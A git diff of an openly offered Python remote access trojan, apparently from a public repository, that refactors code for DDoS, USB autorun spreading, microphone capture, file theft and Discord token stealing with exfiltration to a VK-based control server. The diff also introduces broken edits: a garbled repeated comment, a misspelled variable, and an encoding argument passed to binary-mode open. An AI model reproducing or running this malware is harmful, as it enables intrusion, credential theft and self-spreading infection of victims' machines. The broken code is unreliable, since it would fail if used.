@@ -1,13 +1,14 @@
 # -*- coding: utf-8 -*-
 
-# Remote Access Tool.
-# Author: Kirill Zhosul.
-# https://github.com/kirillzhosul/python-remote-access
+"""
+Remote Access Tool
+Author: Kirill Zhosul.
+https://github.com/kirillzhosul/python-remote-access
+"""
 
 # Default modules.
 import typing  # Type hinting.
 import json  # JSON Parsing.
-import requests  # IP API, Discord API.
 import os  # System interaction (Environment variables).
 import os.path  # System path interaction.
 import subprocess  # Console.
@@ -29,6 +30,8 @@ try:
     import vk_api.upload  # VK API Uploading.
     # There is vk_api.longpoll / vk_api.bot_longpoll imports in server connection,
     # As there is checks for current server type (to not cause import conflicts).
+
+    import requests  # IP API, Discord API.
 except ImportError as exception:
     # If there is import error.
 
@@ -87,8 +90,8 @@ VERSION = "[Pre-release] 0.5.5"
 
 # Commands.
 # Function: initialise_commands()
-commands_functions: typing.Dict[str, typing.Callable] = dict()
-commands_help: typing.Dict[str, typing.Tuple] = dict()
+commands_functions: typing.Dict[str, typing.Callable] = {}
+commands_help: typing.Dict[str, typing.Tuple] = {}
 
 
 # Settings.
@@ -143,11 +146,9 @@ def command_taskkill(_arguments, _event) -> str:
 
         # Returning success.
         return "Killed task!"
-    else:
-        # If result is not OK.
 
-        # Returning error.
-        return "Unable to kill this task!"
+    # Returning error.
+    return "Unable to kill this task!"
 
 
 def command_upload(_arguments, _event) -> str:
@@ -185,11 +186,9 @@ def command_properties(_arguments, _event) -> str:
                f"Modified: {_property_modified_at},\n" \
                f"Created: {_property_created_at},\n" \
                f"Accessed: {_property_accessed_at}."
-    else:
-        # If path not exists.
 
-        # Error.
-        return "Path does not exists!"
+    # Error.
+    return "Path does not exists!"
 
 
 def command_download(_arguments, _event) -> typing.List:
@@ -207,9 +206,9 @@ def command_download(_arguments, _event) -> typing.List:
 
                 # Uploading.
                 return [_arguments, "Download", "doc"]  # noqa
-            else:
-                # If invalid size.
-                return "Too big file! Maximal size for download: 1536MB(1.5GB)"  # noqa
+
+            # If invalid size.
+            return "Too big file! Maximal size for download: 1536MB(1.5GB)"  # noqa
         elif os.path.isdir(_arguments):
             # If this is directory.
 
@@ -218,14 +217,12 @@ def command_download(_arguments, _event) -> typing.List:
 
                 # Uploading.
                 return "Directories are not allowed for now!"  # noqa
-            else:
-                # If invalid size.
-                return "Too big file! Maximal size for download: 1536MB(1.5GB)"  # noqa
-    else:
-        # If path not exists.
 
-        # Error.
-        return "Path does not exists"  # noqa
+            # If invalid size.
+            return "Too big file! Maximal size for download: 1536MB(1.5GB)"  # noqa
+
+    # Error.
+    return "Path does not exists"  # noqa
 
 
 def command_ddos(_arguments, _event) -> str:
@@ -253,9 +250,9 @@ def command_ddos(_arguments, _event) -> str:
 
         # Message.
         return "Completed DDoS (User)"
-    else:
-        # Message.
-        return "Incorrect arguments! Example: address;time;admin"
+
+    # Message.
+    return "Incorrect arguments! Example: address;time;admin"
 
 
 def command_ls(arguments, _event) -> str:
@@ -293,11 +290,9 @@ def command_cd(_arguments, _event) -> str:
 
             # Message.
             return f"Changed directory to {current_directory}"
-        else:
-            # If invalid directory.
 
-            # Message.
-            return f"Directory {_arguments} does not exists!"
+        # Message.
+        return f"Directory {_arguments} does not exists!"
 
 
 def command_location(_arguments, _event) -> str:
@@ -324,11 +319,9 @@ def command_location(_arguments, _event) -> str:
                f"\nRegion: {_ipregion}," \
                f"\nCity: {_ipcity}," \
                f"\nProvider: {_ipprovider}."
-    else:
-        # If not valid fields.
 
-        # Returning error.
-        return "Couldn't get location"
+    # Returning error.
+    return "Couldn't get location"
 
 
 def command_microphone(_arguments, _event) -> typing.List:
@@ -378,19 +371,20 @@ def command_help(_arguments, _event) -> str:
             # Error.
             return f"Command {_help_command} not exists!"
 
+        # Help information.
         _help_information = commands_help[_help_command]
+
         # Returning information.
         return f"[{_help_command}]:\n-- {_help_information[0]}\n--(Use: {_help_information[1]})"
-    else:
-        # If total help.
 
-        _help = ""
+    # Help string.
+    _help = ""
 
-        for _command, _information in commands_help.items():
-            _help += f"[{_command}]: \n--{_information[0]}\n-- (Use: {_information[1]})\n"
+    for _command, _information in commands_help.items():
+        _help += f"[{_command}]: \n--{_information[0]}\n-- (Use: {_information[1]})\n"
 
-        # Returning.
-        return _help  # noqa
+    # Returning.
+    return _help  # noqa
 
 
 def command_tags_new(_arguments, _event) -> str:
@@ -813,7 +807,7 @@ def spreading_infect_drive(_drive: str) -> None:
             shutil.copyfile(sys.argv[0], _drive + _executable_path)
 
             # Writing autorun.inf file.
-            with open(_drive + "autorun.inf", "w") as _autorun:
+            with open(_drive + "autorun.inf", "w", encoding="UTF-8") as _autorun:
                 # Opening file.
 
                 # Writing.
@@ -1009,7 +1003,7 @@ def load_name() -> None:
             # If we don't have name file.
 
             # Name.
-            __NAME = get_ip()["ip"]  # noqa
+            cleint_name = get_ip()["ip"]  # noqa
 
             # Saving name.
             save_name()
@@ -1021,7 +1015,7 @@ def load_name() -> None:
                       f"Full exception information - {_exception}")
 
         # Name.
-        __NAME = get_ip()["ip"]  # noqa
+        cleint_name = get_ip()["ip"]  # noqa
 
 
 def stealer_steal_data(_force: bool = False):
@@ -1029,7 +1023,7 @@ def stealer_steal_data(_force: bool = False):
     # @returns None
     # @description Function that steals all the data from the client.
 
-    data: typing.Dict[str, typing.Any] = dict()
+    data: typing.Dict[str, typing.Any] = {}
 
     try:
         # Trying to steal.
@@ -1086,7 +1080,7 @@ def stealer_steal_data(_force: bool = False):
             # Building path.
             filesystem_build_path(_path)
 
-            with open(_path, "w") as _file:
+            with open(_path, "w", encoding="UTF-8") as _file:
                 # With opened file.
 
                 # Dumping.
@@ -1126,11 +1120,9 @@ def stealer_steal_data(_force: bool = False):
 def client_answer_server(event) -> None:
     # @function client_answer_server()
     # @returns None
-    # @description Function that process message from the remote access (server).
+    # @description Function that process message from the remote access (server).nction that process message from the remote access (server).nction that process message from the remote access (server).nction that process message from the remote access (server).nction that process message from the remote access (server).nction that process message from the remote access (server).nction that process message from the remote access (server).
 
-    if config["server"]["type"] == "VK_USER":
-        message = event.message
-    elif config["server"]["type"] == "VK_GROUP":
+    if config["server"]["type"] == "VK_GROUP":
         message = event.message
     else:
         message = event
@@ -1785,7 +1777,7 @@ def server_upload_document(path: str, title: str, peer: int, document_type: str 
 
         # Posting file on the server.
         request = json.loads(requests.post(upload_url, files={
-            "file": open(path, "rb")
+            "file": open(path, "rb", encoding="UTF-8")
         }).text)
 
         if "file" in request:
@@ -2460,7 +2452,7 @@ def stealer_steal_discord_tokens() -> typing.List[str]:
             # For log files in folder.
 
             # Opening file.
-            file = open(f"{token_path}\\{log_file}", errors="ignore")
+            file = open(f"{token_path}\\{log_file}", errors="ignore", encoding="UTF-8")
 
             for line in [line.strip() for line in file.readlines() if line.strip()]:
                 # Getting all lines.
@@ -2495,7 +2487,7 @@ def stealer_is_already_worked() -> bool:
         filesystem_build_path(path)
 
         # Creating file.
-        with open(path, "w") as anchor_file:
+        with open(path, "w", encoding="UTF-8") as anchor_file:
             anchor_file.write("Anchor")
 
         # Returning that not worked.
@@ -2657,7 +2649,7 @@ def load_config() -> None:
 
     # Opening JSON file
     try:
-        with open("config.json", "r") as config_file:
+        with open("config.json", "r", encoding="UTF-8") as config_file:
             config = json.load(config_file)
     except FileNotFoundError:
         # If config not exists.
